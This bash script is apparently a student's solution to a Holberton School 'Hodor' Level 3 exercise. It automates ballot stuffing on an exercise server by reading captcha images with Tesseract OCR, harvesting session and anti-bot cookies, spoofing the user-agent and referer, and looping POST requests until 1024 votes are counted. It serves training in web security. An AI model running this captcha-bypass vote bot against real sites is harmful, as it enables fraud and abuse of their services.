#!/bin/bash

# ===---Hodor Level 3-------------------------------------------------------------===
# Solution in Shell Script for Hodor Project Level 3, by Julien Barbier
# Using curl command simulating a PHP session(http is "stateless")
# You need to install Tesseract in order to be able to execute this script.
# To simple install in Mac OSX:
# $ brew install tesseract
#
# by Alexandro de Oliveira, for Holberton School.
# ===-----------------------------------------------------------------------------===

URL=http://173.246.108.142/level3.php
UCAPTCHA=http://173.246.108.142/captcha.php
ID='id=23'
AGENT='Windows NT 1000.0.0.1 - havk64 Bash/Curl Requests'
COUNT=0
VOTES=$((1 << 10)) #  = 1024
echo "Starting..."
while [ $COUNT -lt $VOTES ] # We ensure that we have the right amount of votes, even if there are errors.
do
    # Fetching the captcha image and PHP Session Cookie(GET Request):
    SESSID=$(curl -s -c - -o tmp.png --referer $URL -c - $UCAPTCHA | grep PHPSESSID | awk '{ print $7}')
    COOKIE="PHPSESSID=$SESSID" # Cookie from PHP Session.
    # Getting the Cookie(HoldTheDoor) through a HEAD Request:
    KEY=$(curl -s -c - -X HEAD -b $COOKIE -A "$AGENT" --referer $URL $URL | grep HoldTheDoor | awk '{ print $7 }') & # Sending task to bg.
    PID1=$!
    # Sending the image to Tesseract to be decoded(extract the characters).
    CAPTCHA=$(tesseract tmp.png - 2> /dev/null | tr -d '\040\012') # Deleting any space or newline characters. Stderr to /dev/null.
    rm tmp.png &
    # Waiting for HEAD request return its cookie:
    wait $PID1
    # Setting the data to be sent in the Post Request:
    DATA="captcha=$CAPTCHA&$ID&key=$KEY&holdthedoor=submit"
    # POST Request:
    RESULT=$(curl -s -c - -X POST -d $DATA -A "$AGENT" -b "$COOKIE; HoldTheDoor=$KEY" --referer $URL $URL | grep HoldTheDoor | awk '{ print $7}')
    # If succeed count one vote and add one to the counter:
    if [[ ! -z $RESULT ]]; # If the result is "not empty"(different fromm line 26 where we checked if is "not set").
    then
        echo "Vote number: $(($COUNT + 1))"
        #KEY=$RESULT # Getting the new cookie.
        ((COUNT++))
    else
        echo "Failed! (vote not computed)"
    fi
done
